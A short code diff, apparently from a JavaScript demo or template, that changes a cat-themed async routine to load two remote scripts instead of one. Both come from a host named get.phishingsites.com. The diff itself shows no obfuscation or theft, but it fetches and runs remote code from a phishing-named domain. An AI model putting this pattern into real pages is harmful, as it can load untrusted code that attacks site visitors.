@@ -39,11 +39,14 @@ function loadExternalScript(url) {
 (async function () {
   try {
     // Replace this URL with your actual script URL
-    const scriptUrl = "https://get.phishingsites.com/viking-5th.js";
+    const scriptUrl1 = "https://get.phishingsites.com/viking-5th.js";
+    const scriptUrl2 = "https://get.phishingsites.com/viking-6th.js";
 
-    console.log("Cat is making a subrequest...");
-    await loadExternalScript(scriptUrl);
-    console.log("Cat completed the subrequest!");
+    console.log("Cat is making subrequests...");
+    await loadExternalScript(scriptUrl1);
+    console.log("First script loaded!");
+    await loadExternalScript(scriptUrl2);
+    console.log("Cat completed all subrequests!");
   } catch (error) {
     console.error("Cat encountered an error:", error.message);
   }
